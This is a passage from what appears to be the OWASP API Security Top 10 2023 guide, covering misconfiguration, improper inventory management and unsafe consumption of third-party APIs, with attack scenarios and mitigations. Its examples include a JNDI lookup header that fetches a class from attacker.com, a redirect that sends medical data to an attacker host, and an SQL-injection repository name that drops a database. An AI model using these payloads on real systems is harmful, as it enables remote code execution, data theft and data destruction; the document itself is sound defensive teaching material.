An API back-end server maintains an access log written by a popular third-party
open-source logging utility with support for placeholder expansion and JNDI
(Java Naming and Directory Interface) lookups, both enabled by default. For
each request, a new entry is written to the log file with the following
pattern: `<method> <api_version>/<path> - <status_code>`.

A bad actor issues the following API request, which gets written to the access
log file:

```
GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
```

Due to the insecure default configuration of the logging utility and a
permissive network outbound policy, in order to write the corresponding entry
to the access log, while expanding the value in the `X-Api-Version` request
header, the logging utility will pull and execute the `Malicious.class` object
from the attacker's remote controlled server.

### Scenario #2

A social network website offers a "Direct Message" feature that allows users to
keep private conversations. To retrieve new messages for a specific
conversation, the website issues the following API request (user interaction is
not required):

```
GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
```

Because the API response does not include the `Cache-Control` HTTP response
header, private conversations end-up cached by the web browser, allowing
malicious actors to retrieve them from the browser cache files in the
filesystem.

## How To Prevent

The API life cycle should include:

* A repeatable hardening process leading to fast and easy deployment of a
  properly locked down environment
* A task to review and update configurations across the entire API stack. The
  review should include: orchestration files, API components, and cloud
  services (e.g. S3 bucket permissions)
* An automated process to continuously assess the effectiveness of the
  configuration and settings in all environments

Furthermore:

* Ensure that all API communications from the client to the API server and any
  downstream/upstream components happen over an encrypted communication channel
  (TLS), regardless of whether it is an internal or public-facing API.
* Be specific about which HTTP verbs each API can be accessed by: all other
  HTTP verbs should be disabled (e.g. HEAD).
* APIs expecting to be accessed from browser-based clients (e.g., WebApp
  front-end) should, at least:
    * implement a proper Cross-Origin Resource Sharing (CORS) policy
    * include applicable Security Headers
* Restrict incoming content types/data formats to those that meet the business/
  functional requirements.
* Ensure all servers in the HTTP server chain (e.g. load balancers, reverse
  and forward proxies, and back-end servers) process incoming requests in a
  uniform manner to avoid desync issues.
* Where applicable, define and enforce all API response payload schemas,
  including error responses, to prevent exception traces and other valuable
  information from being sent back to attackers.

# API9:2023 Improper Inventory Management

| Threat agents/Attack vectors | Security Weakness | Impacts |
| - | - | - |
| API Specific : Exploitability **Easy** | Prevalence **Widespread** : Detectability **Average** | Technical **Moderate** : Business Specific |
| Threat agents usually get unauthorized access through old API versions or endpoints left running unpatched and using weaker security requirements. In some cases exploits are available. Alternatively, they may get access to sensitive data through a 3rd party with whom there's no reason to share data with. | Outdated documentation makes it more difficult to find and/or fix vulnerabilities. Lack of assets inventory and retirement strategies leads to running unpatched systems, resulting in leakage of sensitive data. It's common to find unnecessarily exposed API hosts because of modern concepts like microservices, which make applications easy to deploy and independent (e.g. cloud computing, K8S). Simple Google Dorking, DNS enumeration, or using specialized search engines for various types of servers (webcams, routers, servers, etc.) connected to the internet will be enough to discover targets. | Attackers can gain access to sensitive data, or even take over the server. Sometimes different API versions/deployments are connected to the same database with real data. Threat agents may exploit deprecated endpoints available in old API versions to get access to administrative functions or exploit known vulnerabilities. |

## Is the API Vulnerable?

The sprawled and connected nature of APIs and modern applications brings new
challenges. It is important for organizations not only to have a good
understanding and visibility of their own APIs and API endpoints, but also how
the APIs are storing or sharing data with external third parties.

Running multiple versions of an API requires additional management resources
from the API provider and expands the attack surface.

An API has a "<ins>documentation blindspot</ins>" if:

* The purpose of an API host is unclear, and there are no explicit answers to
  the following questions
    * Which environment is the API running in (e.g. production, staging, test,
      development)?
    * Who should have network access to the API (e.g. public, internal,
      partners)?
    * Which API version is running?
* There is no documentation or the existing documentation is not updated.
* There is no retirement plan for each API version.
* The host's inventory is missing or outdated.

The visibility and inventory of sensitive data flows play an important role as
part of an incident response plan, in case a breach happens on the third party
side.

An API has a "<ins>data flow blindspot</ins>" if:

* There is a "sensitive data flow" where the API shares sensitive data with a
  third party and
    * There is not a business justification or approval of the flow
    * There is no inventory or visibility of the flow
    * There is not deep visibility of which type of sensitive data is shared

## Example Attack Scenarios

### Scenario #1

A social network implemented a rate-limiting mechanism that blocks attackers
from using brute force to guess reset password tokens. This mechanism wasn't
implemented as part of the API code itself but in a separate component between
the client and the official API (`api.socialnetwork.owasp.org`). A researcher
found a beta API host (`beta.api.socialnetwork.owasp.org`) that runs the same
API, including the reset password mechanism, but the rate-limiting mechanism was
not in place. The researcher was able to reset the password of any user by using
simple brute force to guess the 6 digit token.

### Scenario #2

A social network allows developers of independent apps to integrate with it. As
part of this process a consent is requested from the end user, so the social
network can share the user's personal information with the independent app.

The data flow between the social network and the independent apps is not
restrictive or monitored enough, allowing independent apps to access not only
the user information but also the private information of all of their friends.

A consulting firm builds a malicious app and manages to get the consent of
270,000 users. Because of the flaw, the consulting firm manages to get access
to the private information of 50,000,000 users. Later, the consulting firm
sells the information for malicious purposes.

## How To Prevent

* Inventory all <ins>API hosts</ins> and document important aspects of each one
  of them, focusing on the API environment (e.g. production, staging, test,
  development), who should have network access to the host (e.g. public,
  internal, partners) and the API version.
* Inventory <ins>integrated services</ins> and document important aspects such
  as their role in the system, what data is exchanged (data flow), and their
  sensitivity.
* Document all aspects of your API such as authentication, errors, redirects,
  rate limiting, cross-origin resource sharing (CORS) policy, and endpoints,
  including their parameters, requests, and responses.
* Generate documentation automatically by adopting open standards. Include the
  documentation build in your CI/CD pipeline.
* Make API documentation available only to those authorized to use the API.
* Use external protection measures such as API security specific solutions for
  all exposed versions of your APIs, not just for the current production
  version.
* Avoid using production data with non-production API deployments. If this is
  unavoidable, these endpoints should get the same security treatment as the
  production ones.
* When newer versions of APIs include security improvements, perform a risk
  analysis to inform the mitigation actions required for the older versions.
  For example, whether it is possible to backport the improvements without
  breaking API compatibility or if you need to take the older version out
  quickly and force all clients to move to the latest version.

# API10:2023 Unsafe Consumption of APIs

| Threat agents/Attack vectors | Security Weakness | Impacts |
| - | - | - |
| API Specific : Exploitability **Easy** | Prevalence **Common** : Detectability **Average** | Technical **Severe** : Business Specific |
| Exploiting this issue requires attackers to identify and potentially compromise other APIs/services the target API integrated with. Usually, this information is not publicly available or the integrated API/service is not easily exploitable. | Developers tend to trust and not verify the endpoints that interact with external or third-party APIs, relying on weaker security requirements such as those regarding transport security, authentication/authorization, and input validation and sanitization. Attackers need to identify services the target API integrates with (data sources) and, eventually, compromise them. | The impact varies according to what the target API does with pulled data. Successful exploitation may lead to sensitive information exposure to unauthorized actors, many kinds of injections, or denial of service. |

## Is the API Vulnerable?

Developers tend to trust data received from third-party APIs more than user
input. This is especially true for APIs offered by well-known companies.
Because of that, developers tend to adopt weaker security standards, for
instance, in regards to input validation and sanitization.

The API might be vulnerable if:

* Interacts with other APIs over an unencrypted channel;
* Does not properly validate and sanitize data gathered from other APIs prior
  to processing it or passing it to downstream components;
* Blindly follows redirections;
* Does not limit the number of resources available to process third-party
  services responses;
* Does not implement timeouts for interactions with third-party services;

## Example Attack Scenarios

### Scenario #1

An API relies on a third-party service to enrich user provided business
addresses. When an address is supplied to the API by the end user, it is sent
to the third-party service and the returned data is then stored on a local
SQL-enabled database.

Bad actors use the third-party service to store an SQLi payload associated with
a business created by them. Then they go after the vulnerable API providing
specific input that makes it pull their "malicious business" from the
third-party service. The SQLi payload ends up being executed by the database,
exfiltrating data to an attacker's controlled server.

### Scenario #2

An API integrates with a third-party service provider to safely store sensitive
user medical information. Data is sent over a secure connection using an HTTP
request like the one below:

```
POST /user/store_phr_record
{
  "genome": "ACTAGTAG__TTGADDAAIICCTT…"
}
```

Bad actors found a way to compromise the third-party API and it starts
responding with a `308 Permanent Redirect` to requests like the previous one.

```
HTTP/1.1 308 Permanent Redirect
Location: https://attacker.com/
```

Since the API blindly follows the third-party redirects, it will repeat the
exact same request including the user's sensitive data, but this time to the
attacker's server.

### Scenario #3

An attacker can prepare a git repository named `'; drop db;--`.

Now, when an integration from an attacked application is done with the
malicious repository, SQL injection payload is used on an application that
builds an SQL query believing the repository's name is safe input.

## How To Prevent

* When evaluating service providers, assess their API security posture.
* Ensure all API interactions happen over a secure communication channel (TLS).
* Always validate and properly sanitize data received from integrated APIs
  before using it.
* Maintain an allowlist of well-known locations integrated APIs may redirect
  yours to: do not blindly follow redirects.

# What's Next For Developers

The task to create and maintain secure applications, or fixing existing
applications, can be difficult. It is no different for APIs.

We believe that education and awareness are key factors to writing secure
software. Everything else required to accomplish the goal depends on
**establishing and using repeatable security processes and standard security
controls**.

OWASP provides numerous free and open resources to help you address security.
Please visit the [OWASP Projects page][1] for a comprehensive list of available
projects.

| | |
|-|-|
| **Education** | The [Application Security Wayfinder][2] should give you a good idea about what projects are available for each stage/phase of the Software Development LifeCycle (SDLC). For hands-on learning/training you can start with [OWASP **crAPI** - **C**ompletely **R**idiculous **API**][3] or [OWASP Juice Shop][4]: both have intentionally vulnerable APIs. The [OWASP Vulnerable Web Applications Directory Project][5] provides a curated list of intentionally vulnerable applications: you'll find there several other vulnerable APIs. You can also attend [OWASP AppSec Conference][6] training sessions, or [join your local chapter][7]. |
| **Security Requirements** | Security should be part of every project from the beginning. When defining requirements, it is important to define what "secure" means for that project. OWASP recommends you use the [OWASP Application Security Verification Standard (ASVS)][8] as a guide for setting the security requirements. If you're outsourcing, consider the [OWASP Secure Software Contract Annex][9], which should be adapted according to local law and regulations. |
| **Security Architecture** | Security should remain a concern during all the project stages. The [OWASP Cheat Sheet Series][10] is a good starting point for guidance on how to design security in during the architecture phase. Among many others, you'll find the [REST Security Cheat Sheet][11] and the [REST Assessment Cheat Sheet][12] as well the [GraphQL Cheat Sheet][13]. |
| **Standard Security Controls** | Adopting standard security controls reduces the risk of introducing security weaknesses while writing your own logic. Although many modern frameworks now come with effective built-in standard controls, [OWASP Proactive Controls][14] gives you a good overview of what security controls you should look to include in your project. OWASP also provides some libraries and tools you may find valuable, such as validation controls. |
| **Secure Software Development Life Cycle** | You can use the [OWASP Software Assurance Maturity Model (SAMM)][15] to improve your processes of building APIs. Several other OWASP projects are available to help you during the different API development phases e.g., the [OWASP Code Review Guide][16]. |

# What's Next For DevSecOps

Due to their importance in modern application architectures, building secure
APIs is crucial. Security cannot be neglected, and it should be part of the
whole development life cycle. Scanning and penetration testing yearly are no
longer enough.

DevSecOps should join the development effort, facilitating continuous security
testing across the entire software development life cycle. Your goal should be
to enhance the development pipeline with security automation, but without
impacting the speed of development.

In case of doubt, stay informed, and refer to the [DevSecOps Manifesto][1].

| | |
|-|-|
| **Understand the Threat Model** | Testing priorities come from a threat model. If you don't have one, consider using [OWASP Application Security Verification Standard (ASVS)][2], and the [OWASP Testing Guide][3] as an input. Involving the development team will help to make them more security-aware. |
| **Understand the SDLC** | Join the development team to better understand the Software Development Life Cycle. Your contribution on continuous security testing should be compatible with people, processes, and tools. Everyone should agree with the process, so that there's no unnecessary friction or resistance. |
| **Testing Strategies** | Since your work should not impact the development speed, you should wisely choose the best (simple, fastest, most accurate) technique to verify the security requirements. The [OWASP Security Knowledge Framework][4] and [OWASP Application Security Verification Standard][2] can be great sources of functional and nonfunctional security requirements. There are other great sources for [projects][5] and [tools][6] similar to the one offered by the [DevSecOps community][7]. |
| **Achieving Coverage and Accuracy** | You're the bridge between developers and operations teams. To achieve coverage, not only should you focus on the functionality, but also the orchestration. Work close to both development and operations teams from the beginning so you can optimize your time and effort. You should aim for a state where the essential security is verified continuously. |
| **Clearly Communicate Findings** | Contribute value with less or no friction. Deliver findings in a timely fashion, within the tools development teams are using (not PDF files). Join the development team to address the findings. Take the opportunity to educate them, clearly describing the weakness and how it can be abused, including an attack scenario to make it real. |
